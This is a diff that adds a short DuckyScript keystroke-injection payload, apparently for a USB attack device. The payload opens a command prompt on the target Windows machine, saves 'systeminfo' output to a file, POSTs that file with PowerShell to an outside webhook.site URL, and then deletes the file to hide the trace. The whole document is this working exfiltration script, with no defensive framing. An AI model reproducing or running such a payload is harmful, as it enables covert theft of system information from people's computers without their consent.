@@ -1,0 +1,18 @@
+REM Open Command Prompt and Extract system info via Webhook
+GUI r
+BACKSPACE
+DELAY 500
+STRING cmd /k
+ENTER
+DELAY 1000
+STRING systeminfo > SysInfo
+ENTER
+DELAY 4000
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/30adaa5c-c45a-4403-b71d-086d346fb356 -Method POST -InFile SysInfo
+ENTER
+DELAY 1000
+STRING del SysInfo /s /f /q
+ENTER
+DELAY 100
+STRING exit
+ENTER
